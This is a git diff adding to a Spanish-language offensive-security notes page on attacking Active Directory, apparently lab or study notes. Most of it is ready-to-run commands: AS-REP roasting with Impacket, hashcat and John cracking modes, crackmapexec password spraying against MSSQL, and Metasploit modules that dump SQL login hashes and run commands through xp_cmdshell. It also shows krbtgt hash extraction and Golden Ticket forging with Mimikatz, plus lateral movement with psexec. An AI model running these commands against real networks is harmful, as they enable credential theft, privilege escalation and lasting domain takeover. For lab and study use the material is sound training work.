@@ -84,8 +84,113 @@ Lo probamos.
 crackmapexec smb IP(AD) -u SVC_SQLService -p '1234'
 ```
 
-**AS -REP Roasting Attack**
+## **AS -REP Roasting Attack**
+
+Solo requiere listado de usuarios.
 
 ```
 impacket-GetNPUsers -dc-ip IP(AD) dominio.com/ -no-pass -userfile users.txt -outfile salida.txt
 ```
+
+Para crackear la contraseña.
+
+```
+hashcat --help | grep AS_REP --> 18200
+```
+
+Para ver si corre base de datos
+
+```
+nmap -n -P0 -p 1433 -sV --open -vv IP(AD)
+```
+
+Obtener credenciales.
+
+```
+crackmapexec mssql IP(AD) -u usuarios.txt -p diccionario.txt --local-auth --continue-on-success
+```
+
+```
+msfconsole -q
+use auxiliary/admin/mssql/mssql_sql
+set RHOST IP(AD)
+set PASSWORD
+set SQL select password.hash from sys.sql_logins
+
+#caracteristicas de la base de datos
+use auxiliary/admin/mssql/mssql_enum
+```
+
+## MSSQL--> Content Header:Salt:Hash
+
+Para romper hashes de contraseñas de SQL Server, puedes usar herramientas como `hashcat` o `john`:
+
+```bash
+# Con hashcat (modo 1731 para MSSQL 2012+)
+hashcat -m 1731 --force -a 0 hash.mssql diccionario.txt
+
+# Con John the Ripper
+john --format=mssql12 --wordlist=diccionario.txt hash.mssql
+```
+
+> **Nota:** El modo 1731 corresponde a hashes de SQL Server 2012 en adelante (`mssql12` en John).
+
+El procedimiento extendido `xp_cmdshell` permite ejecutar comandos del sistema operativo directamente desde SQL Server. Esto puede facilitar la escalada de privilegios o la persistencia.
+
+```sql
+-- Permite ejecutar comandos del sistema desde MSSQL
+EXEC xp_cmdshell 'whoami';
+```
+
+Para automatizar esto con Metasploit:
+
+```bash
+use auxiliary/admin/mssql/mssql_exec
+```
+
+> **Precaución:** `xp_cmdshell` suele estar deshabilitado por defecto. Se requiere acceso privilegiado para activarlo.
+
+## Golden Ticket
+
+El ataque de Golden Ticket es una técnica avanzada que explota el funcionamiento interno del protocolo Kerberos en entornos de Active Directory. En esencia, este ataque permite a un atacante generar tickets de autenticación válidos sin necesidad de pasar por el proceso normal de autenticación del dominio. Esto se logra obteniendo el hash de la cuenta `krbtgt`, una cuenta especial utilizada por el controlador de dominio para firmar los Ticket Granting Tickets (TGTs). Una vez que el atacante tiene este hash, puede usar herramientas como Mimikatz para generar un TGT falso —el llamado "Golden Ticket"— que puede incluir cualquier identidad y privilegios deseados, incluso acceso como administrador del dominio.
+
+Este ticket falsificado puede inyectarse en una sesión activa (por ejemplo, en una máquina como WIN10-PC2), y a partir de ahí, el atacante puede autenticarse ante el controlador de dominio como si fuera un usuario legítimo. Esto le permite acceder a otros recursos del dominio, como servidores de archivos (ej. FILESERVER), estaciones de trabajo, o incluso a los propios controladores de dominio, sin necesidad de credenciales reales. Además, como el atacante puede establecer el tiempo de validez del ticket, este acceso puede mantenerse durante largos periodos sin ser detectado.
+
+El ataque Golden Ticket es particularmente grave porque incluso si las contraseñas de los usuarios comprometidos se cambian, el acceso persistente se mantiene hasta que el hash de `krbtgt` sea rotado dos veces, lo cual es un proceso sensible y que requiere cuidado. Por esto, es considerado una técnica de post-explotación crítica y de alta peligrosidad en escenarios de compromiso total del dominio.
+
+<figure><img src="../.gitbook/assets/image (1638).png" alt=""><figcaption></figcaption></figure>
+
+El "Golden Ticket" permite crear tickets TGT falsificados usando la clave de servicio de `krbtgt`, lo que otorga acceso completo al dominio.
+
+Para esto necesitas:
+
+* El hash de la cuenta `krbtgt`
+* El nombre del dominio
+* El SID del dominio
+
+Ejemplo con `impacket-psexec`:
+
+```bash
+impacket-psexec enterprise.com/Administrator:'Password'@IP(AD)
+```
+
+> Este acceso es útil para moverse lateralmente dentro del dominio una vez generado un TGT válido.
+
+## Mimikatz.exe
+
+Con Mimikatz puedes extraer y manipular secretos del sistema, como el hash de la cuenta `krbtgt` necesario para generar Golden Tickets:
+
+```bash
+lsadump::lsa /inject /name:krbtgt
+```
+
+> Este comando requiere privilegios de SYSTEM. Una vez obtenido el hash, puede utilizarse para falsificar tickets TGT con herramientas como `ticketer.py` de Impacket.
+
+Obtenemos el ID y NTLM y creamos el ticket.
+
+```
+kerberos::golden /domain:enterprise.com /sid:ID /rc4:NTLM /user:Administrator /ticket:ticket
+```
+
+## Active directory basics (THM)
+
